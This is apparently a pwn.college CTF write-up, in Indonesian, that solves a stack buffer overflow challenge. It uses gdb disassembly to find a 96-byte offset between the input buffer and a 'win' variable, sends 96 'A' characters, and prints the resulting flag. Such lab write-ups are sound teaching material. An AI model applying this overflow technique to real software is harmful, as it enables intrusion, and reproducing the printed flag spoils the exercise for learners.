```
hacker@binary-exploitation~your-first-overflow-hard:/challenge$ cat DESCRIPTION.md 
This challenge is identical to its "easy" version from a security perspective, but has the following changes:

1. Unlike the easy version, it does not give you helpful debug output.
   You will have to recover this information using a debugger.
2. **For all other "hard" versions**, the source code will not be provided, and you will need to reverse-engineer the binary using your knowledge of the "easy" version as a reference.
   However, for this one challenge, to get you familiar with the differences between the easy and hard versions, we will provide the source code.
3. Some randomization is different.
   Buffers might have different lengths, offsets might vary, etc.
   You will need to reverse engineer this information from the binary!
```

Disini dijelaskan kalau chall ini mirip dengan OverFlow yang pertama, namun kita tidak diberitahu alamat memory variable tertentu, isi dari stack dan lainnya. Di point 3 kita diminta untuk melakukan reverse engineer. Sebenarnya, karena ada source code C disini, kita bisa saja cek source codenya lalu analisis. Namun karena pembuat soal meminta kita untuk me reverse binary nya jadi kita coba dengan gdb.

```
hacker@binary-exploitation~your-first-overflow-hard:/challenge$ gdb ./binary-exploitation-first-overflow
GNU gdb (GDB) 16.2
Copyright (C) 2024 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-unknown-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./binary-exploitation-first-overflow...
(No debugging symbols found in ./binary-exploitation-first-overflow)
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x0000000000401000  _init
0x00000000004010e0  __errno_location@plt
0x00000000004010f0  puts@plt
0x0000000000401100  write@plt
0x0000000000401110  __stack_chk_fail@plt
0x0000000000401120  printf@plt
0x0000000000401130  geteuid@plt
0x0000000000401140  read@plt
0x0000000000401150  setvbuf@plt
0x0000000000401160  open@plt
0x0000000000401170  exit@plt
0x0000000000401180  strerror@plt
0x0000000000401190  _start
0x00000000004011c0  _dl_relocate_static_pie
0x00000000004011d0  deregister_tm_clones
0x0000000000401200  register_tm_clones
0x0000000000401240  __do_global_dtors_aux
0x0000000000401270  frame_dummy
0x0000000000401276  bin_padding
0x000000000040220c  win
0x0000000000402313  challenge
0x000000000040240c  main
0x00000000004024c0  __libc_csu_init
0x0000000000402530  __libc_csu_fini
0x0000000000402538  _fini
```

Disini kita tahu ada function main, challenge dan win yang kemungkinan 3 function krusial di chall ini (karena masih black box). Coba lakukan breakpoint di main lalu disas main lalu run.

```
(gdb) b main
Breakpoint 1 at 0x402414
(gdb) r
Starting program: /challenge/binary-exploitation-first-overflow 

Breakpoint 1, 0x0000000000402414 in main ()
(gdb) disas main
Dump of assembler code for function main:
   0x000000000040240c <+0>:     endbr64
   0x0000000000402410 <+4>:     push   %rbp
   0x0000000000402411 <+5>:     mov    %rsp,%rbp
=> 0x0000000000402414 <+8>:     sub    $0x1000,%rsp
   0x000000000040241b <+15>:    orq    $0x0,(%rsp)
   0x0000000000402420 <+20>:    sub    $0x30,%rsp
   0x0000000000402424 <+24>:    mov    %edi,-0x1014(%rbp)
   0x000000000040242a <+30>:    mov    %rsi,-0x1020(%rbp)
   0x0000000000402431 <+37>:    mov    %rdx,-0x1028(%rbp)
   0x0000000000402438 <+44>:    mov    %fs:0x28,%rax
   0x0000000000402441 <+53>:    mov    %rax,-0x8(%rbp)
   0x0000000000402445 <+57>:    xor    %eax,%eax
   0x0000000000402447 <+59>:    mov    0x2be2(%rip),%rax        # 0x405030 <stdin@@GLIBC_2.2.5>
   0x000000000040244e <+66>:    mov    $0x0,%ecx
   0x0000000000402453 <+71>:    mov    $0x2,%edx
   0x0000000000402458 <+76>:    mov    $0x0,%esi
   0x000000000040245d <+81>:    mov    %rax,%rdi
   0x0000000000402460 <+84>:    call   0x401150 <setvbuf@plt>
   0x0000000000402465 <+89>:    mov    0x2bb4(%rip),%rax        # 0x405020 <stdout@@GLIBC_2.2.5>
   0x000000000040246c <+96>:    mov    $0x0,%ecx
   0x0000000000402471 <+101>:   mov    $0x2,%edx
   0x0000000000402476 <+106>:   mov    $0x0,%esi
   0x000000000040247b <+111>:   mov    %rax,%rdi
   0x000000000040247e <+114>:   call   0x401150 <setvbuf@plt>
   0x0000000000402483 <+119>:   mov    -0x1028(%rbp),%rdx
   0x000000000040248a <+126>:   mov    -0x1020(%rbp),%rcx
   0x0000000000402491 <+133>:   mov    -0x1014(%rbp),%eax
   0x0000000000402497 <+139>:   mov    %rcx,%rsi
   0x000000000040249a <+142>:   mov    %eax,%edi
   0x000000000040249c <+144>:   call   0x402313 <challenge>
   0x00000000004024a1 <+149>:   mov    $0x0,%eax
   0x00000000004024a6 <+154>:   mov    -0x8(%rbp),%rcx
   0x00000000004024aa <+158>:   xor    %fs:0x28,%rcx
   0x00000000004024b3 <+167>:   je     0x4024ba <main+174>
   0x00000000004024b5 <+169>:   call   0x401110 <__stack_chk_fail@plt>
   0x00000000004024ba <+174>:   leave
   0x00000000004024bb <+175>:   ret
End of assembler dump.
```

Seperti yang terlihat di bagian: **0x000000000040249c <+144>:   call   0x402313 <challenge>**

Ada function main yang dipanggil dengan _call_. Coba set breakpoint disitu lalu continue. Jika sudah hit breakpoint di challenge coba disas.

```
(gdb) c
Continuing.

Breakpoint 2, 0x000000000040231b in challenge ()
(gdb) disas challenge
Dump of assembler code for function challenge:
   0x0000000000402313 <+0>:     endbr64
   0x0000000000402317 <+4>:     push   %rbp
   0x0000000000402318 <+5>:     mov    %rsp,%rbp
=> 0x000000000040231b <+8>:     sub    $0xa0,%rsp
   0x0000000000402322 <+15>:    mov    %edi,-0x84(%rbp)
   0x0000000000402328 <+21>:    mov    %rsi,-0x90(%rbp)
   0x000000000040232f <+28>:    mov    %rdx,-0x98(%rbp)
   0x0000000000402336 <+35>:    mov    %fs:0x28,%rax
   0x000000000040233f <+44>:    mov    %rax,-0x8(%rbp)
   0x0000000000402343 <+48>:    xor    %eax,%eax
   0x0000000000402345 <+50>:    lea    -0x70(%rbp),%rdx
   0x0000000000402349 <+54>:    mov    $0x0,%eax
   0x000000000040234e <+59>:    mov    $0xc,%ecx
   0x0000000000402353 <+64>:    mov    %rdx,%rdi
   0x0000000000402356 <+67>:    rep stos %rax,%es:(%rdi)
   0x0000000000402359 <+70>:    mov    %rdi,%rdx
   0x000000000040235c <+73>:    mov    %eax,(%rdx)
   0x000000000040235e <+75>:    add    $0x4,%rdx
   0x0000000000402362 <+79>:    movq   $0x0,-0x78(%rbp)
   0x000000000040236a <+87>:    movq   $0x1000,-0x78(%rbp)
   0x0000000000402372 <+95>:    mov    -0x78(%rbp),%rax
   0x0000000000402376 <+99>:    mov    %rax,%rsi
   0x0000000000402379 <+102>:   lea    0xd90(%rip),%rdi        # 0x403110
   0x0000000000402380 <+109>:   mov    $0x0,%eax
   0x0000000000402385 <+114>:   call   0x401120 <printf@plt>
   0x000000000040238a <+119>:   mov    -0x78(%rbp),%rdx
   0x000000000040238e <+123>:   lea    -0x70(%rbp),%rax
   0x0000000000402392 <+127>:   mov    %rax,%rsi
   0x0000000000402395 <+130>:   mov    $0x0,%edi
   0x000000000040239a <+135>:   call   0x401140 <read@plt>
   0x000000000040239f <+140>:   mov    %eax,-0x7c(%rbp)
   0x00000000004023a2 <+143>:   cmpl   $0x0,-0x7c(%rbp)
   0x00000000004023a6 <+147>:   jns    0x4023d4 <challenge+193>
   0x00000000004023a8 <+149>:   call   0x4010e0 <__errno_location@plt>
   0x00000000004023ad <+154>:   mov    (%rax),%eax
   0x00000000004023af <+156>:   mov    %eax,%edi
   0x00000000004023b1 <+158>:   call   0x401180 <strerror@plt>
   0x00000000004023b6 <+163>:   mov    %rax,%rsi
   0x00000000004023b9 <+166>:   lea    0xd78(%rip),%rdi        # 0x403138
   0x00000000004023c0 <+173>:   mov    $0x0,%eax
   0x00000000004023c5 <+178>:   call   0x401120 <printf@plt>
   0x00000000004023ca <+183>:   mov    $0x1,%edi
   0x00000000004023cf <+188>:   call   0x401170 <exit@plt>
   0x00000000004023d4 <+193>:   mov    -0x10(%rbp),%eax
   0x00000000004023d7 <+196>:   test   %eax,%eax
   0x00000000004023d9 <+198>:   je     0x4023e5 <challenge+210>
   0x00000000004023db <+200>:   mov    $0x0,%eax
   0x00000000004023e0 <+205>:   call   0x40220c <win>
   0x00000000004023e5 <+210>:   lea    0xd70(%rip),%rdi        # 0x40315c
   0x00000000004023ec <+217>:   call   0x4010f0 <puts@plt>
--Type <RET> for more, q to quit, c to continue without paging--c
   0x00000000004023f1 <+222>:   mov    $0x0,%eax
   0x00000000004023f6 <+227>:   mov    -0x8(%rbp),%rcx
   0x00000000004023fa <+231>:   xor    %fs:0x28,%rcx
   0x0000000000402403 <+240>:   je     0x40240a <challenge+247>
   0x0000000000402405 <+242>:   call   0x401110 <__stack_chk_fail@plt>
   0x000000000040240a <+247>:   leave
   0x000000000040240b <+248>:   ret
End of assembler dump.
```

Sesuai _info functions_ tadi, ada function win yang dipanggil. Karena ini sama seperti chall OverFlow yang pertama, harusnya ada flag di function main itu. Sekarang kita harus cari alamat dari  _win_variable_ dan juga alamat _input kita_ diambil untuk cek selisih alamatnya.

Kita coba cek beberapa baris sebelum win function dipanggil

```
   0x00000000004023d4 <+193>:   mov    -0x10(%rbp),%eax
   0x00000000004023d7 <+196>:   test   %eax,%eax
   0x00000000004023d9 <+198>:   je     0x4023e5 <challenge+210>
   0x00000000004023db <+200>:   mov    $0x0,%eax
   0x00000000004023e0 <+205>:   call   0x40220c <win>
```
Syarat pemanggilannya itu **eax** itu harus != 0 (Sama seperti chall 1). Lalu sekarang kita cek bagaimana value eax itu terisi. Jawabannya ada di **0x00000000004023d4 <+193>:   mov    -0x10(%rbp),%eax**. Artinya eax disini akan diisi dengan value dari alamat **-0x10(%rbp)** atau rbp - 0x10. Ini alamat dari _win variable_, sekarang perlu mencari alamat input buffernya.

Dibagian atas, ada function read

```
   0x0000000000402379 <+102>:   lea    0xd90(%rip),%rdi        # 0x403110
   0x0000000000402380 <+109>:   mov    $0x0,%eax
   0x0000000000402385 <+114>:   call   0x401120 <printf@plt>
   0x000000000040238a <+119>:   mov    -0x78(%rbp),%rdx
   0x000000000040238e <+123>:   lea    -0x70(%rbp),%rax
   0x0000000000402392 <+127>:   mov    %rax,%rsi
   0x0000000000402395 <+130>:   mov    $0x0,%edi
   0x000000000040239a <+135>:   call   0x401140 <read@plt>
```

function read disini mengambil 3 argumen yang salah satunya adalah input buffer: **read(int fd, void \*buf, size_t count)**

Di arsitektur x86-64 (yang saat ini digunakan), argumen untuk fungsi dilewatkan menggunakan register CPU dengan urutan ini:

1. Argumen 1 (fd): ditaruh di register %rdi (atau %edi untuk 32-bit)
2. Argumen 2 (buf): ditaruh di register %rsi
3. Argumen 3 (count): ditaruh di register %rdx

Yang perlu difokuskan adalah &data.input kita, yakni di argumen kedua atau %rsi. Jadi kita cek darimana arah %rsi ini. Setelah di cek ternyata dari sini:

```
   0x000000000040238e <+123>:   lea    -0x70(%rbp),%rax
   0x0000000000402392 <+127>:   mov    %rax,%rsi
```

Alamatnya ada di -0x70(%rbp) atau rbp - 0x70. Sekarang sudah dapat dua alamat yang dibutuhkan tinggal hitung selisihnya.

(rbp - 0x10) -  (rbp - 0x70) = rbp - 0x10 - rbp + 0x70 = 0x60 atau 96 di decimal. Artinya selisihnya adalah 96 byte dan kita perlu input buffer >= 96 byte atau bisa char sebanyak 96. Disini aku menggunakan "A" seperti sebelumnya. Jika gdb error coba jalankan filenya seperti biasa dan inject payloadsnya.

```
hacker@binary-exploitation~your-first-overflow-hard:/challenge$ ./binary-exploitation-first-overflow
Send your payload (up to 4096 bytes)!
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
You win! Here is your flag:
pwn.college{wVeRWtVC81vPZjFa7s7jinuRtrf.dBTOywSO1IzNzEzW}


Goodbye!
```

**Flag: pwn.college{wVeRWtVC81vPZjFa7s7jinuRtrf.dBTOywSO1IzNzEzW}**
